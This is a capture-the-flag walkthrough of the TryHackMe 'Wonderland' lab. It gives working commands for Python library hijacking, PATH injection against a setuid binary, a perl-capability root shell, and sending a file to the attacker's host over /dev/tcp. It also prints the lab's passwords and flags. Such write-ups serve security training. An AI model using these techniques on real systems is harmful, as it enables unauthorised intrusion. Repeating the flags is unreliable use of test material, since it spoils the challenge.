---
render_with_liquid: false
title: WonderLand
date: 2023-07-25 16:37:42 +1400
tags: [tryhackme, nmap, linux, feroxbuster, forensics, steganography, enum, sudo, python-script, python-library-hijack, suid, reversing, detect-it-easy, decompilation, ghidra, path-injection, getcap]
---




# Recon
---

## Nmap

```bash

# Nmap 7.94 scan initiated Tue Jul 25 16:37:42 2023 as: nmap -sVC -p- -T4 -Pn -vv -oA Wonderland 10.10.99.150
Nmap scan report for 10.10.99.150
Host is up, received user-set (0.29s latency).
Scanned at 2023-07-25 16:37:42 CST for 398s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDe20sKMgKSMTnyRTmZhXPxn+xLggGUemXZLJDkaGAkZSMgwM3taNTc8OaEku7BvbOkqoIya4ZI8vLuNdMnESFfB22kMWfkoB0zKCSWzaiOjvdMBw559UkLCZ3bgwDY2RudNYq5YEwtqQMFgeRCC1/rO4h4Hl0YjLJufYOoIbK0EPaClcDPYjp+E1xpbn3kqKMhyWDvfZ2ltU1Et2MkhmtJ6TH2HA+eFdyMEQ5SqX6aASSXM7OoUHwJJmptyr2aNeUXiytv7uwWHkIqk3vVrZBXsyjW4ebxC3v0/Oqd73UWd5epuNbYbBNls06YZDVI8wyZ0eYGKwjtogg5+h82rnWN
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHH2gIouNdIhId0iND9UFQByJZcff2CXQ5Esgx1L96L50cYaArAW3A3YP3VDg4tePrpavcPJC2IDonroSEeGj6M=
|   256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAsWAdr9g04J7Q8aeiWYg03WjPqGVS6aNf/LF+/hMyKh
80/tcp open  http    syn-ack ttl 63 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Follow the white rabbit.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Tue Jul 25 16:44:20 2023 -- 1 IP address (1 host up) scanned in 398.42 seconds
```


## 80 - Website : Rabbit


#### Info

![](/assets/obsidian/2f76a440a9fe22b9573e3366c9d83991.png)


#### Directories

> Filter status code 500 since this site use it when not-found

```bash
feroxbuster -t 150 -o ferox_80.txt -u 'http://10.10.99.150' -C 500
```

```bash
301      GET        0l        0w        0c http://10.10.99.150/img => img/
200      GET       11l       24w      217c http://10.10.99.150/main.css
301      GET        0l        0w        0c http://10.10.99.150/r => r/
301      GET        0l        0w        0c http://10.10.99.150/r/a => a/
200      GET        0l        0w  1993438c http://10.10.99.150/img/white_rabbit_1.jpg
200      GET       10l       44w      402c http://10.10.99.150/
[####################] - 50s   120005/120005  0s      found:6       errors:253
[####################] - 49s    30000/30000   606/s   http://10.10.99.150/
[####################] - 48s    30000/30000   621/s   http://10.10.99.150/img/
[####################] - 47s    30000/30000   636/s   http://10.10.99.150/r/
[####################] - 45s    30000/30000   670/s   http://10.10.99.150/r/a/
```


# Exploit
---

Since this machine have only 1 attack vector, look everything possible on port `80`


## Image Forensics


### Download Files From Feroxbuster Output


#### One Liner

```bash
cat ferox_80.txt|awk '{print $6}'|tee to_download.txt; mkdir dump && cd dump; wget -mk -nH -i to_download.txt
```


#### Notes

```bash
┌──(kali㉿kali)-[~/thm/Wonderland]
└─$ mkdir loot&&cd loot
```

Filter files to download

```bash
cat ../feroxbuster.txt|awk '{ if ($1 != 301) { print $6 } }' | tee to_download.txt
```

Download Files from the list

```bash
wget -i to_download.txt -mk -nH
```


### Extract hidden message from image

```bash
┌──(kali㉿kali)-[~/thm/Wonderland/loot]
└─$ ls -lah
total 2.0M
drwxr-xr-x 2 kali kali 4.0K Jul 25 19:33 .
drwxr-xr-x 4 kali kali 4.0K Jul 25 19:29 ..
-rw-r--r-- 1 kali kali  402 Jun  2  2020 index.html
-rw-r--r-- 1 kali kali  217 Jun  2  2020 main.css
-rw-r--r-- 1 kali kali   93 Jul 25 19:32 to_download.txt
-rw-r--r-- 1 kali kali 2.0M May 26  2020 white_rabbit_1.jpg
```

```bash
┌──(kali㉿kali)-[~/thm/Wonderland/loot]
└─$ stegseek -sf white_rabbit_1.jpg
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: ""
[i] Original filename: "hint.txt".
[i] Extracting to "white_rabbit_1.jpg.out".

┌──(kali㉿kali)-[~/thm/Wonderland/loot]
└─$ cat white_rabbit_1.jpg.out
follow the r a b b i t 
```

> `follow the r a b b i t `


## Brute force directory recursively

Feroxbuster have brute forced the dir : `http://10.10.99.150/r/a`

Let it brute force `r/a/b/b/i/t`

```bash
feroxbuster -t 200 -C 500 -u 'http://10.10.99.150/r/a' -r -d 30 --force-recursion
```

```bash
200      GET        9l       31w      264c http://10.10.99.150/r/a/
200      GET        9l       23w      237c http://10.10.99.150/r/a/b/
200      GET        9l       27w      253c http://10.10.99.150/r/a/b/b/
200      GET        9l       27w      259c http://10.10.99.150/r/a/b/b/i/
```

![](/assets/obsidian/03795f3f897ca0cb0e3fdb5212e61ca4.png)

![](/assets/obsidian/cd2c2a88af61248c7684000d1b84ff84.png)

Check source code

![](/assets/obsidian/4cc3e0d5a1091e34214744287432ef89.png)

Potential creds - `alice`:`HowDothTheLittleCrocodileImproveHisShiningTail`


## SSH as user alice

```bash
sshpass -p HowDothTheLittleCrocodileImproveHisShiningTail ssh -o "StrictHostKeyChecking no" alice@10.10.99.150
```

```bash
alice@wonderland:~$ id
uid=1001(alice) gid=1001(alice) groups=1001(alice)
```


## From user Alice to Rabbit

```bash
alice@wonderland:~$ cat /etc/passwd|grep sh$
root:x:0:0:root:/root:/bin/bash
tryhackme:x:1000:1000:tryhackme:/home/tryhackme:/bin/bash
alice:x:1001:1001:Alice Liddell,,,:/home/alice:/bin/bash
hatter:x:1003:1003:Mad Hatter,,,:/home/hatter:/bin/bash
rabbit:x:1002:1002:White Rabbit,,,:/home/rabbit:/bin/bash
```

```bash
alice@wonderland:~$ sudo -l
[sudo] password for alice:
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
    
alice@wonderland:~$ ls -lh /home/alice/walrus_and_the_carpenter.py
-rw-r--r-- 1 root root 3.5K May 25  2020 /home/alice/walrus_and_the_carpenter.py
```

```bash
alice@wonderland:~$ cat /home/alice/walrus_and_the_carpenter.py
import random
poem = """The sun was shining on the sea,
Shining with all his might:
He did his very best to make
The billows smooth and bright —
And this was odd, because it was
The middle of the night.
...
for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was:\t", line)
```

I can't modify the library code

```bash
alice@wonderland:~$ locate random.py
/usr/lib/python3/dist-packages/cloudinit/config/cc_seed_random.py
/usr/lib/python3.6/random.py

alice@wonderland:~$ locate random.py
/usr/lib/python3/dist-packages/cloudinit/config/cc_seed_random.py
/usr/lib/python3.6/random.py

alice@wonderland:~$ ls -lh /usr/lib/python3.6/random.py
-rw-r--r-- 1 root root 27K Apr 18  2020 /usr/lib/python3.6/random.py

alice@wonderland:~$ ls -lh /usr/lib/python3/dist-packages/cloudinit/config/cc_seed_random.py
-rw-r--r-- 1 root root 4.4K Jan 14  2020 /usr/lib/python3/dist-packages/cloudinit/config/cc_seed_random.py
```

But I can create one to let the script load

```bash
alice@wonderland:~$ echo 'import os;os.system("/bin/bash")' > random.py
alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
rabbit@wonderland:~$ id
uid=1002(rabbit) gid=1002(rabbit) groups=1002(rabbit)
```


## From user Rabbit to Hatter


#### Found suid binary in home directory

```bash
rabbit@wonderland:~$ cd /home/rabbit
rabbit@wonderland:/home/rabbit$ ls -la
```

![](/assets/obsidian/fd908209f4d69e6ced733f3e151f86bc.png)

There's a binary with setuid

```bash
rabbit@wonderland:/home/rabbit$ file teaParty
teaParty: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=75a832557e341d3f65157c22fafd6d6ed7413474, not stripped

rabbit@wonderland:/home/rabbit$ ./teaParty
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Tue, 25 Jul 2023 15:16:46 +0000
Ask very nicely, and I will give you some tea while you wait for him

Segmentation fault (core dumped)
```


#### Transfer the binary

```bash
rabbit@wonderland:/home/rabbit$ cat teaParty > /dev/tcp/10.11.19.145/1111
rabbit@wonderland:/home/rabbit$
```

```bash
┌──(kali㉿kali)-[~/thm/Wonderland]
└─$ nc -lvnp 1111 > teaParty
listening on [any] 1111 ...
connect to [10.11.19.145] from (UNKNOWN) [10.10.99.150] 43646
```


#### Validate The binary via checksum

Make sure the binary was not corrupted during transfer

```bash
rabbit@wonderland:/home/rabbit$ md5sum teaParty
8ed7bb982d0c2c3b92d5cafb4f663957  teaParty
```

```bash
┌──(kali㉿kali)-[~/thm/Wonderland]
└─$ md5sum teaParty
8ed7bb982d0c2c3b92d5cafb4f663957  teaParty
```


#### Analyze the binary

Get more info with **detect it easy**

```bash
┌──(kali㉿kali)-[~/thm/Wonderland]
└─$ diec teaParty
ELF64
    Library: GLIBC(2.2.5)[DYN AMD64-64]
    Compiler: gcc((Debian 8.3.0-6) 8.3.0)[DYN AMD64-64]
```

Analyze with Ghidra

![](/assets/obsidian/d49efa8e21127c6679811cc4b568cabb.png)

> Decompiled

```c
void main(void)

{
  setuid(0x3eb);
  setgid(0x3eb);
  puts("Welcome to the tea party!\nThe Mad Hatter will be here soon.");
  system("/bin/echo -n \'Probably by \' && date --date=\'next hour\' -R");
  puts("Ask very nicely, and I will give you some tea while you wait for him");
  getchar();
  puts("Segmentation fault (core dumped)");
  return;
}
```

Obviously, the `date` binary did not specify full path compare to `echo`, let's do path injection


#### Path Injection with SUID binary

```bash
echo -e '#!/bin/bash\n/bin/bash -p' > /tmp/date
chmod +x /tmp/date
export PATH=/tmp:$PATH
./teaParty
```

```bash
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by hatter@wonderland:/home/rabbit$ id
uid=1003(hatter) gid=1002(rabbit) groups=1002(rabbit)
```


#### Get user hatter's password

Got password in user's home directory

```bash
hatter@wonderland:/home/rabbit$ cd /home/hatter/
hatter@wonderland:/home/hatter$ ls -la
total 28
drwxr-x--- 3 hatter hatter 4096 May 25  2020 .
drwxr-xr-x 6 root   root   4096 May 25  2020 ..
lrwxrwxrwx 1 root   root      9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 hatter hatter  220 May 25  2020 .bash_logout
-rw-r--r-- 1 hatter hatter 3771 May 25  2020 .bashrc
drwxrwxr-x 3 hatter hatter 4096 May 25  2020 .local
-rw-r--r-- 1 hatter hatter  807 May 25  2020 .profile
-rw------- 1 hatter hatter   29 May 25  2020 password.txt
hatter@wonderland:/home/hatter$ cat password.txt
WhyIsARavenLikeAWritingDesk?
```

Test the password with ssh

```bash
sshpass -p WhyIsARavenLikeAWritingDesk? ssh -o "StrictHostKeyChecking no" hatter@10.10.44.156
```

```bash
hatter@wonderland:~$ 
```


## From user Hatter to Root

They gave me the user password, this will be a huge hint

```bash
hatter@wonderland:/home$ getcap -r / 2>/dev/null
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
```

> https://gtfobins.github.io/gtfobins/perl/#capabilities

```bash
hatter@wonderland:/home$ /usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'

# id
uid=0(root) gid=1003(hatter) groups=1003(hatter)
```

Stabilize Shell

```bash

# script /dev/null -c bash
Script started, file is /dev/null
root@wonderland:/home# 
```


## Find Flags


#### User Flag

```bash

# cd /home

# ls -la
total 24
drwxr-xr-x  6 root      root      4096 May 25  2020 .
drwxr-xr-x 23 root      root      4096 May 25  2020 ..
drwxr-xr-x  5 alice     alice     4096 Jul 25 14:48 alice
drwxr-x---  6 hatter    hatter    4096 Jul 25 15:02 hatter
drwxr-x---  2 rabbit    rabbit    4096 May 25  2020 rabbit
drwxr-x---  6 tryhackme tryhackme 4096 May 25  2020 tryhackme

# grep -Rin "thm{.*}"
alice/root.txt:1:thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
```


#### Root Flag

```bash
root@wonderland:~# find / -type f -iname user.txt 2>/dev/null
/root/user.txt
root@wonderland:~# cat /root/user.txt
thm{"Curiouser and curiouser!"}
root@wonderland:~#
```
